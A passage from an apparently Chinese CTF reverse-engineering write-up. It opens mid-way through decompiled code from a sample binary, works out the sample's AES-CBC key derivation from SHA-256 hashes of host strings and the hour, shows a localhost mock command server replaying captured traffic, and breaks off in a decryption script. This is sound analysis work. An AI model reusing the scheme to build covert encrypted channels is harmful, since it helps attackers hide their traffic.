strcpy(Source_, Source);</span></span><br><span class="line"><span class="string">  v87 = v86;</span></span><br><span class="line"><span class="string">  v40 = sub_7FF64A853ED0(v156, v86);</span></span><br><span class="line"><span class="string">  v41 = v40;</span></span><br><span class="line"><span class="string">  `std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(Source_);</span></span><br><span class="line"><span class="string">  if ( !v41 )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">LABEL_17:</span></span><br><span class="line"><span class="string">    sub_7FF64A6CC680(v156);</span></span><br><span class="line"><span class="string">    memset(&amp;buf__6, 0, sizeof(buf__6));</span></span><br><span class="line"><span class="string">    memset(buf__7, 0, 1u);</span></span><br><span class="line"><span class="string">    v29 = sub_7FF64A6CC5B0(&amp;buf__6);</span></span><br><span class="line"><span class="string">    Source_6 = (const char *)sub_7FF64A805FB0(v29);</span></span><br><span class="line"><span class="string">    v111 = strcpy(Destination__5, Source_6);</span></span><br><span class="line"><span class="string">    v56 = v111;</span></span><br><span class="line"><span class="string">    v31 = sub_7FF64A6CC550(buf__7);</span></span><br><span class="line"><span class="string">    Source_7 = (const char *)sub_7FF64A807E70(v31);</span></span><br><span class="line"><span class="string">    v112 = strcpy(Destination__6, Source_7);</span></span><br><span class="line"><span class="string">    v83 = v112;</span></span><br><span class="line"><span class="string">    sub_7FF64A5F4C50(v112, v56);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  memset_with_0(v157, 0x18u);</span></span><br><span class="line"><span class="string">  Destination_1 = &amp;v148;</span></span><br><span class="line"><span class="string">  memset(&amp;buf__8, 0, sizeof(buf__8));</span></span><br><span class="line"><span class="string">  v88 = sub_7FF64A6CC310(&amp;buf__8);</span></span><br><span class="line"><span class="string">  Source_8 = (char *)sub_7FF64A811830(v88);</span></span><br><span class="line"><span class="string">  v91 = strcpy(Destination_1, Source_8);</span></span><br><span class="line"><span class="string">  v92 = sub_7FF64A854000(v156, v91);</span></span><br><span class="line"><span class="string">  v116 = sub_7FF64A9D1B20(v92, v129);</span></span><br><span class="line"><span class="string">  v117 = sub_7FF64A606A60(v157, v129);</span></span><br><span class="line"><span class="string">  `std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(v129);</span></span><br><span class="line"><span class="string">  v22 = sub_7FF64A5A1F60(v161);</span></span><br><span class="line"><span class="string">  sub_7FF64A5F0530((__int64)v168, v22, &amp;v169);</span></span><br><span class="line"><span class="string">  v93 = sub_7FF64A854A20(v157);</span></span><br><span class="line"><span class="string">  v23 = (unsigned __int8 *)sub_7FF64A5A1F60(v157);</span></span><br><span class="line"><span class="string">  AES_CBC_DEC((__int64)v168, v23, v93);</span></span><br><span class="line"><span class="string">  v118 = sub_7FF64A616F60(v164, v157);</span></span><br><span class="line"><span class="string">  v94 = v152;</span></span><br><span class="line"><span class="string">  v95 = sub_7FF64A853BE0(v152, 0);</span></span><br><span class="line"><span class="string">  LOBYTE(v33) = 0;</span></span><br><span class="line"><span class="string">  LOBYTE(v24) = 1;</span></span><br><span class="line"><span class="string">  v119 = sub_7FF64A9D19D0(v155, v164, v95, v24, v33);</span></span><br><span class="line"><span class="string">  memset(&amp;buf__9, 0, sizeof(buf__9));</span></span><br><span class="line"><span class="string">  v96 = sub_7FF64A6CC370(&amp;buf__9);</span></span><br><span class="line"><span class="string">  Source_9 = (char *)sub_7FF64A80F970(v96);</span></span><br><span class="line"><span class="string">  v98 = strcpy(Destination__7, Source_9);</span></span><br><span class="line"><span class="string">  v99 = v98;</span></span><br><span class="line"><span class="string">  *(_DWORD *)v34 |= 1u;</span></span><br><span class="line"><span class="string">  if ( !(unsigned __int8)sub_7FF64A853ED0(v155, v98) )</span></span><br><span class="line"><span class="string">    goto LABEL_7;</span></span><br><span class="line"><span class="string">  memset(&amp;buf__10, 0, sizeof(buf__10));</span></span><br><span class="line"><span class="string">  v100 = sub_7FF64A6CC430(&amp;buf__10);</span></span><br><span class="line"><span class="string">  Source_10 = (char *)sub_7FF64A80DAB0(v100);</span></span><br><span class="line"><span class="string">  v102 = strcpy(Destination__8, Source_10);</span></span><br><span class="line"><span class="string">  v103 = v102;</span></span><br><span class="line"><span class="string">  dst[2] = sub_7FF64A9D1BD0(dst, v102);</span></span><br><span class="line"><span class="string">  *(_DWORD *)v34 |= 6u;</span></span><br><span class="line"><span class="string">  Destination_2 = &amp;v149;</span></span><br><span class="line"><span class="string">  memset(&amp;buf__11, 0, sizeof(buf__11));</span></span><br><span class="line"><span class="string">  v104 = sub_7FF64A6CC3D0(&amp;buf__11);</span></span><br><span class="line"><span class="string">  Source_11 = (char *)sub_7FF64A80F970(v104);</span></span><br><span class="line"><span class="string">  v107 = strcpy(Destination_2, Source_11);</span></span><br><span class="line"><span class="string">  v108 = sub_7FF64A854000(v155, v107);</span></span><br><span class="line"><span class="string">  if ( (unsigned __int8)sub_7FF64A853BF0(v108, dst) )</span></span><br><span class="line"><span class="string">    v54 = 1;</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">LABEL_7:</span></span><br><span class="line"><span class="string">    v54 = 0;</span></span><br><span class="line"><span class="string">  v47 = v54;</span></span><br><span class="line"><span class="string">  if ( (v34[0] &amp; 4) != 0 )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    *(_DWORD *)v34 &amp;= ~4u;</span></span><br><span class="line"><span class="string">    sub_7FF64A6CC680(dst);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  if ( (v34[0] &amp; 2) != 0 )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    *(_DWORD *)v34 &amp;= ~2u;</span></span><br><span class="line"><span class="string">    `std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(Destination__8);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  if ( (v34[0] &amp; 1) != 0 )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    *(_DWORD *)v34 &amp;= ~1u;</span></span><br><span class="line"><span class="string">    `std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(Destination__7);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  if ( !v47 )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    sub_7FF64A6CC680(v155);</span></span><br><span class="line"><span class="string">    `std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(v164);</span></span><br><span class="line"><span class="string">    sub_7FF64A854A30(v157);</span></span><br><span class="line"><span class="string">    goto LABEL_17;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  v48 = 1;</span></span><br><span class="line"><span class="string">  sub_7FF64A6CC680(v155);</span></span><br><span class="line"><span class="string">  `std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(v164);</span></span><br><span class="line"><span class="string">  sub_7FF64A854A30(v157);</span></span><br><span class="line"><span class="string">  sub_7FF64A6CC680(v156);</span></span><br><span class="line"><span class="string">  sub_7FF64A5A7B70(v165);</span></span><br><span class="line"><span class="string">  sub_7FF64A6CC680(v158);</span></span><br><span class="line"><span class="string">  sub_7FF64A854A30(v154);</span></span><br><span class="line"><span class="string">  `std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(v163);</span></span><br><span class="line"><span class="string">  sub_7FF64A6CC680(v159);</span></span><br><span class="line"><span class="string">  sub_7FF64A854A30(v161);</span></span><br><span class="line"><span class="string">  `std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(time_H);</span></span><br><span class="line"><span class="string">  return v48;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>func2中定义了一个AES_CBC加密，iv为<font color=lime><strong>000102030405060708090a0b0c0d0e0f</strong></font>，Key的构造过程则比较复杂：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)v34 = <span class="number">0</span>;</span><br><span class="line">Time = <span class="built_in">time64</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">gmtime64_s</span>(&amp;Tm, &amp;Time);</span><br><span class="line"><span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">v2 = <span class="built_in">sub_7FF64A6CC040</span>((__int64)&amp;buf);</span><br><span class="line">Format = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_7FF64A81EFB0</span>(v2); <span class="comment">//时间格式</span></span><br><span class="line"><span class="built_in">strftime</span>(Buffer, <span class="number">3u</span>, Format, &amp;Tm); <span class="comment">//获取了某个时间类</span></span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span> *)time_H, Buffer);</span><br><span class="line"><span class="built_in">memset_with_0</span>(key, <span class="number">0x18u</span>);</span><br><span class="line">v57 = <span class="built_in">cp_arg2plus192_arg1</span>(a2, v143);</span><br><span class="line">v59 = v57;</span><br><span class="line">v58 = (_QWORD *)<span class="built_in">cp_arg2plus160_arg1</span>(a2, v140);</span><br><span class="line">v60 = v58;</span><br><span class="line"><span class="built_in">GEN_AES_KEY</span>((<span class="type">unsigned</span> __int64)key, v58, v59, time_H); <span class="comment">//生成AES密钥</span></span><br><span class="line">`std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v140);</span><br><span class="line">`std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v143);</span><br><span class="line">*(_QWORD *)&amp;iv = <span class="number">0x706050403020100LL</span>; <span class="comment">//AES iv</span></span><br><span class="line">*((_QWORD *)&amp;iv + <span class="number">1</span>) = <span class="number">0xF0E0D0C0B0A0908LL</span>;</span><br><span class="line"><span class="built_in">sub_7FF64A5D73D0</span>(a2, v159);</span><br><span class="line"><span class="built_in">LOBYTE</span>(v33) = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">LOBYTE</span>(v4) = <span class="number">32</span>;</span><br><span class="line"><span class="built_in">sub_7FF64A8540E0</span>(v159, v163, <span class="number">0xFFFFFFFFLL</span>, v4, v33, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">memset_with_0</span>(msg_, <span class="number">0x18u</span>);</span><br><span class="line"><span class="built_in">sub_7FF64A616E40</span>(msg_, v163);</span><br><span class="line">key_p = <span class="built_in">QwordPointer</span>(key);</span><br><span class="line"><span class="built_in">AES_KEY_STREAM_GEN_</span>((__int64)key_stream, key_p, &amp;iv); <span class="comment">//扩展AES密钥</span></span><br><span class="line">dst_ = <span class="built_in">sub_7FF64A854A20</span>(msg_);</span><br><span class="line">msg = (_BYTE *)<span class="built_in">QwordPointer</span>(msg_);</span><br><span class="line"><span class="built_in">AES_CBC_ENC</span>((__int64)key_stream, msg, dst_); <span class="comment">//AES加密</span></span><br></pre></td></tr></table></figure>

<p>查看时间格式获取，发现是一个自解密（已去除混淆）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)(v2 + <span class="number">520</span>) = <span class="number">0x103971E</span>;</span><br><span class="line">*a1 ^= <span class="number">0x3Bu</span>;</span><br><span class="line">a1[<span class="number">1</span>] ^= <span class="number">0xDFu</span>;</span><br><span class="line">a1[<span class="number">2</span>] ^= <span class="number">3u</span>;</span><br></pre></td></tr></table></figure>

<p>解密之后是<font color=lime><strong>%H</strong></font>，也就是小时（依据流量包在这里是06），查看GEN_AES_KEY：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__m128 **__fastcall <span class="title">GEN_AES_KEY</span><span class="params">(__m128 **key, <span class="type">char</span> *a2, __int64 **a3, _QWORD *p_time_H)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  n0x20 = <span class="number">0</span>;</span><br><span class="line">  *(_OWORD *)keya = <span class="number">0</span>;</span><br><span class="line">  v27 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sub_7FF64A9D4DA0</span>(keya, <span class="number">0x20u</span>);</span><br><span class="line">  key_1 = (__m128i *)keya[<span class="number">0</span>];</span><br><span class="line">  *(_OWORD *)keya[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  key_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  keya[<span class="number">1</span>] = key_1[<span class="number">2</span>].m128i_i8;</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)a2 + <span class="number">3</span>) &lt;= <span class="number">0xFu</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = &amp;a2[*((_QWORD *)a2 + <span class="number">2</span>)];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (<span class="type">char</span> *)(*((_QWORD *)a2 + <span class="number">2</span>) + *(_QWORD *)a2);</span><br><span class="line">    a2 = *(<span class="type">char</span> **)a2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">SHA256__</span>(a2, v10, key_1, (__m128i *)key_1[<span class="number">2</span>].m128i_i8);</span><br><span class="line">  Size = (<span class="type">size_t</span>)a3[<span class="number">2</span>];</span><br><span class="line">  Size_1 = p_time_H[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">0x7FFFFFFFFFFFFFFFLL</span> - Size &lt; Size_1 )</span><br><span class="line">    <span class="built_in">sub_7FF64A5A1570</span>();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)a3[<span class="number">3</span>] &gt; <span class="number">0xF</span> )</span><br><span class="line">    a3 = (__int64 **)*a3;</span><br><span class="line">  <span class="keyword">if</span> ( p_time_H[<span class="number">3</span>] &gt; <span class="number">0xFu</span> )</span><br><span class="line">    p_time_H = (_QWORD *)*p_time_H;</span><br><span class="line">  <span class="built_in">sub_7FF64A9D54A0</span>(v28, Size_1, v11, a3, Size, p_time_H, Size_1);</span><br><span class="line">  *(_OWORD *)Block = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sub_7FF64A9D4DA0</span>(Block, <span class="number">0x20u</span>);</span><br><span class="line">  key_2 = (__m128i *)Block[<span class="number">0</span>];</span><br><span class="line">  *(_OWORD *)Block[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  key_2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  Block[<span class="number">1</span>] = &amp;key_2[<span class="number">2</span>];</span><br><span class="line">  v15 = v28;</span><br><span class="line">  <span class="keyword">if</span> ( n0xF &gt; <span class="number">0xF</span> )</span><br><span class="line">    v15 = (<span class="type">char</span> **)v28[<span class="number">0</span>];</span><br><span class="line">  v16 = (<span class="type">char</span> *)v15 + (<span class="type">unsigned</span> __int64)v28[<span class="number">2</span>];</span><br><span class="line">  v17 = (<span class="type">char</span> *)v28;</span><br><span class="line">  <span class="keyword">if</span> ( n0xF &gt; <span class="number">0xF</span> )</span><br><span class="line">    v17 = v28[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">SHA256__</span>(v17, v16, key_2, (__m128i *)key_2[<span class="number">2</span>].m128i_i8);</span><br><span class="line">  *(_OWORD *)key = <span class="number">0</span>;</span><br><span class="line">  *key = <span class="number">0</span>;</span><br><span class="line">  key[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  key[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sub_7FF64A9D4DA0</span>(key, <span class="number">0x20u</span>);</span><br><span class="line">  v18 = (__int64)*key;</span><br><span class="line">  *(_OWORD *)v18 = <span class="number">0</span>;</span><br><span class="line">  *(_OWORD *)(v18 + <span class="number">16</span>) = <span class="number">0</span>;</span><br><span class="line">  key[<span class="number">1</span>] = (__m128 *)(v18 + <span class="number">32</span>);</span><br><span class="line">  key_4 = *key;</span><br><span class="line">  key_3 = &amp;(*key)[<span class="number">1</span>].m128_i8[<span class="number">15</span>];</span><br><span class="line">  <span class="keyword">if</span> ( (*key &gt; (__m128 *)((<span class="type">char</span> *)&amp;key_1[<span class="number">1</span>].m128i_u64[<span class="number">1</span>] + <span class="number">7</span>) || key_3 &lt; (<span class="type">char</span> *)key_1)</span><br><span class="line">    &amp;&amp; (key_4 &gt; (__m128 *)((<span class="type">char</span> *)&amp;key_2[<span class="number">1</span>].m128i_u64[<span class="number">1</span>] + <span class="number">7</span>) || key_3 &lt; (<span class="type">char</span> *)key_2)</span><br><span class="line">    &amp;&amp; (key_4 &gt; (__m128 *)key || key_3 &lt; (<span class="type">char</span> *)key) )</span><br><span class="line">  &#123;</span><br><span class="line">    *key_4 = _mm_xor_ps((__m128)_mm_loadu_si128(key_2), (__m128)_mm_loadu_si128(key_1));</span><br><span class="line">    key_4[<span class="number">1</span>] = _mm_xor_ps((__m128)_mm_loadu_si128(key_2 + <span class="number">1</span>), (__m128)_mm_loadu_si128(key_1 + <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    key_3 = (<span class="type">char</span> *)((<span class="type">char</span> *)key_2 - (<span class="type">char</span> *)key_1);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      (*key)-&gt;m128_i8[n0x20] = key_1-&gt;m128i_i8[n0x20] ^ key_2-&gt;m128i_i8[n0x20];</span><br><span class="line">      ++n0x20;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( n0x20 &lt; <span class="number">0x20</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( key_2 )</span><br><span class="line">  &#123;</span><br><span class="line">    key_5 = key_2;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)(v25 - (_QWORD)key_2) &gt;= <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      key_2 = (__m128i *)key_2[<span class="number">-1</span>].m128i_i64[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)((<span class="type">char</span> *)key_5 - (<span class="type">char</span> *)key_2 - <span class="number">8</span>) &gt; <span class="number">0x1F</span> )</span><br><span class="line">        <span class="built_in">invalid_parameter_noinfo_noreturn</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">j_j_free</span>(key_2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_7FF64A9CD3B0</span>(v28, key_3);</span><br><span class="line">  <span class="keyword">if</span> ( key_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    key_6 = key_1;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)(v27 - (_QWORD)key_1) &gt;= <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      key_1 = (__m128i *)key_1[<span class="number">-1</span>].m128i_i64[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)((<span class="type">char</span> *)key_6 - (<span class="type">char</span> *)key_1 - <span class="number">8</span>) &gt; <span class="number">0x1F</span> )</span><br><span class="line">        <span class="built_in">invalid_parameter_noinfo_noreturn</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">j_j_free</span>(key_1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是把两个block取sha256后相互异或得到密钥，两个block分别来自main中的320字节结构体的偏移量160处的内容和192处的内容+两位小时时间戳（06），经过BigFunc1后，160的位置应该会变成<font color=lime><strong>2025082006TheBoss@THUNDERNODE</strong></font>，192处的字节未知</p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>在虚拟机上配置好用户名、机器名、hosts，编写服务器脚本接受程序响应并发送第一个包：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    protocol_version = <span class="string">&#x27;HTTP/1.0&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.path == <span class="string">&#x27;/good&#x27;</span>:</span><br><span class="line">            response_body = <span class="string">b&#x27;&#123;&quot;d&quot;: &quot;085d8ea282da6cf76bb2765bc3b26549a1f6bdf08d8da2a62e05ad96ea645c685da48d66ed505e2e28b968d15dabed15ab1500901eb9da4606468650f72550483f1e8c58ca13136bb8028f976bedd36757f705ea5f74ace7bd8af941746b961c45bcac1eaf589773cecf6f1c620e0e37ac1dfc9611aa8ae6e6714bb79a186f47896f18203eddce97f496b71a630779b136d7bf0c82d560&quot;&#125;&#x27;</span></span><br><span class="line">            <span class="variable language_">self</span>.send_response(<span class="number">200</span>, <span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.send_header(<span class="string">&quot;Server&quot;</span>, <span class="string">&quot;SimpleHTTP/0.6 Python/3.10.11&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.send_header(<span class="string">&quot;Date&quot;</span>, <span class="string">&quot;Wed, 20 Aug 2025 06:12:07 GMT&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-Length&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(response_body)))</span><br><span class="line">            <span class="variable language_">self</span>.end_headers()</span><br><span class="line">            <span class="variable language_">self</span>.wfile.write(response_body)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.send_error(<span class="number">404</span>, <span class="string">&quot;Not Found&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># def log_message(self, format, *args):</span></span><br><span class="line">    <span class="comment">#     return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    port = <span class="number">8000</span></span><br><span class="line">    server = HTTPServer((<span class="string">&#x27;127.0.0.1&#x27;</span>, port), CustomHandler)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Server listening on http://127.0.0.1:<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   Access /good to get the fixed JSON response.&quot;</span>)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<p>发现BigFunction1可以正常继续执行，192处的截断符是“@”，下断点查看解密的密文，是<font color=lime><strong><a href="mailto:&#x70;&#x65;&#97;&#x6e;&#117;&#x74;&#64;&#x74;&#x68;&#x65;&#97;&#110;&#110;&#117;&#97;&#x6c;&#116;&#x72;&#x61;&#x64;&#x69;&#116;&#x69;&#x6f;&#110;&#111;&#x66;&#115;&#116;&#97;&#114;&#105;&#110;&#103;&#97;&#x74;&#x64;&#105;&#115;&#97;&#115;&#x73;&#101;&#109;&#98;&#108;&#x79;&#x66;&#111;&#x72;&#119;&#101;&#x65;&#x6b;&#115;&#x2e;&#116;&#111;&#114;&#101;&#x61;&#x6c;&#x69;&#x7a;&#101;&#x74;&#x68;&#101;&#x66;&#x6c;&#97;&#103;&#119;&#x61;&#115;&#106;&#x75;&#x73;&#116;&#120;&#x6f;&#114;&#101;&#x64;&#119;&#x69;&#116;&#x68;&#x74;&#x68;&#x65;&#x66;&#105;&#108;&#101;&#x6e;&#97;&#109;&#101;&#116;&#104;&#x65;&#x77;&#x68;&#111;&#108;&#101;&#x74;&#105;&#109;&#101;&#x2e;&#99;&#111;&#109;">peanut@theannualtraditionofstaringatdisassemblyforweeks.torealizetheflagwasjustxoredwiththefilenamethewholetime.com</a>:8080</strong></font>，所以192处的实际字符是<font color=violet><strong>peanut</strong></font>，动态调试发现在BigFunction2的AES密钥生成处，偏移量160的位置实际上回到了<font color=violet><strong>TheBoss@THUNDERNODE</strong></font>，动态调试发现key_1为<font color=red><strong>c30b158c92ffbc95e02b222206cec9676eac6654144e5557a2d97569c11ed8df</strong></font>，key_2为<font color=red><strong>56a49e85c98bd96ce5b6217abc02eb5f3eec3ff4a937e1ccc549d30bcbc3b549</strong></font>，密钥为<font color=orange><strong>95af8b095b7465f9059d0358bacc2238504059a0bd79b49b6790a6620add6d96</strong></font>，编写脚本发现可以直接解密，解密整个流量包：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">cipher_hex = <span class="string">&quot;密文&quot;</span></span><br><span class="line">prefix = binascii.unhexlify(cipher_hex)</span><br><span class="line"></span><br><span class="line">block160 = <span class="string">b&quot;TheBoss@THUNDERNODE&quot;</span></span><br><span class="line">block192 = <span class="string">b&quot;peanut06&quot;</span></span><br><span 